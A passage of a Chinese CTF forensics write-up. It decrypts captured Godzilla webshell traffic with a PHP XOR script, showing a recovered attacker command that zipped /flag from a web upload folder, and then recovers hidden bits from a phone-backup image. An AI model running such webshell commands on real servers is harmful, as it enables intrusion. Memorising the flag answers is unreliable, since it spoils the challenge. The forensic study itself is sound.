+<p><a href="https://blog.csdn.net/u011250160/article/details/120501033?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-120501033.nonecase&amp;spm=1018.2226.3001.4187" target="_blank" rel="noopener noreffer">哥斯拉还原加密流量</a>
+</p>
+<p>解密脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>($D,$K){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($D);$i<span style="color:#f92672">++</span>){
+</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $K[$i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">15</span>];
+</span></span><span style="display:flex;"><span>        $D[$i] <span style="color:#f92672">=</span> $D[$i]<span style="color:#f92672">^</span>$c;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $D;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;air123&#39;</span>;
+</span></span><span style="display:flex;"><span>$payloadName<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;payload&#39;</span>;
+</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;d8ea7326e6ec5916&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">gzdecode</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;xxx&#39;</span>),$key));
+</span></span></code></pre></div><p>往下翻，很多加密的流量</p>
+<p>流37看到了上传了一个flag.zip</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051415764.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051415764.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051415764.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051415764.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051415764.png"
+        title="image-20230205141522693" /></p>
+<p>提取出来，直接foremost也是可以</p>
+<!-- raw HTML omitted -->
+<p>上传zip之前可能就是生成zip的流量，看流36 也是有加密流量</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051419362.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051419362.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051419362.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051419362.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051419362.png"
+        title="image-20230205141927315" /></p>
+<p>用上面的解密脚本跑这段加密流量 ，先url解码一下</p>
+<pre tabindex="0"><code>J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>($D, $K)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($D); $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $c <span style="color:#f92672">=</span> $K[$i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">15</span>];
+</span></span><span style="display:flex;"><span>        $D[$i] <span style="color:#f92672">=</span> $D[$i] <span style="color:#f92672">^</span> $c;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $D;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;air123&#39;</span>;
+</span></span><span style="display:flex;"><span>$payloadName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;payload&#39;</span>;
+</span></span><span style="display:flex;"><span>$key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d8ea7326e6ec5916&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">gzdecode</span>(<span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&#39;</span>), $key));
+</span></span></code></pre></div><p>跑出来生成zip的命令如下</p>
+<pre tabindex="0"><code>cmdLineP   sh -c &#34;cd &#34;/var/www/html/upload/&#34;;zip -o flag.zip /flag -P airDAS1231qaSW@&#34; 2&gt;&amp;1methodName   execCommand
+</code></pre><p>所以zip密码是<code>airDAS1231qaSW@</code></p>
+<!-- raw HTML omitted -->
+<h2 id="机你太美">机你太美</h2>
+<blockquote>
+<p>坤坤的手机里面，隐藏着什么秘密呢</p>
+</blockquote>
+<p>npbk是夜神模拟器的备份文件，</p>
+<p>用7zip 可以打开 备份文件 拿到镜像文件</p>
+<p>（赛题附件当时打开是img，后来换附件也没注意。。）</p>
+<!-- raw HTML omitted -->
+<p>附件更新后7zip打开就拿到vmdk镜像文件了</p>
+<!-- raw HTML omitted -->
+<p>手机大师没打开</p>
+<p>用取证大师打开</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051459860.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051459860.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051459860.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051459860.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051459860.png"
+        title="image-20230205145917807" /></p>
+<p>有很多加密的zip,里面的文件是flag</p>
+<p>图片呢就拿出这两张比较特殊的jpg和png</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051756542.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051756542.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051756542.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051756542.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051756542.png"
+        title="image-20230205175650457" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051757776.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051757776.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051757776.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051757776.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051757776.png"
+        title="image-20230205175714712" /></p>
+<p>png在 alpha2通道有东西</p>
+<!-- raw HTML omitted -->
+<p>提取出来，黑白像素转01二进制，注意要竖着跑 ,像素太多，我将结果保存到文件里</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>image <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;1.png&#39;</span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1532</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">961</span>):
+</span></span><span style="display:flex;"><span>      pixel <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>getpixel((y,x))
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#       print(pixel)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> pixel[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
+</span></span><span style="display:flex;"><span>         res<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>         res<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;0&#39;</span>
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;res.txt&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(res)
+</span></span></code></pre></div><p>然后找到这一段有0的字符串，注意开头结尾是0还是1</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051839303.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051839303.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051839303.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051839303.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051839303.png"
+        title="image-20230205183939247" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051844301.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051844301.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051844301.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051844301.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051844301.png"
+        title="image-20230205184408254" /></p>
+<p><code>e01544a9333ef62a3aa27357eb52ea8a</code>拿去解压50.zip ,因为这个与其他文件长度不一样</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051846271.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051846271.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051846271.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051846271.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051846271.png"
+        title="image-20230205184650239" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051848817.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051848817.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051848817.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051848817.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051848817.png"
+        title="image-20230205184816781" /></p>
+<p>flag还是加密的</p>
+<p>回到那个jpg文件，exif跑了一下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051810738.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051810738.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051810738.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051810738.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051810738.png"
+        title="image-20230205181043687" /></p>
+<p>有个信息 是 XOR DASCTF2022 , 异或同样也能用cyber</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051852423.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051852423.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051852423.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051852423.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302051852423.png"
+        title="image-20230205185238365" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-title="西湖论剑" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-title="西湖论剑"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-title="西湖论剑"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-title="西湖论剑"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/posts/ctf/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/" class="next" rel="next" title="强网拟态wp">强网拟态wp<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
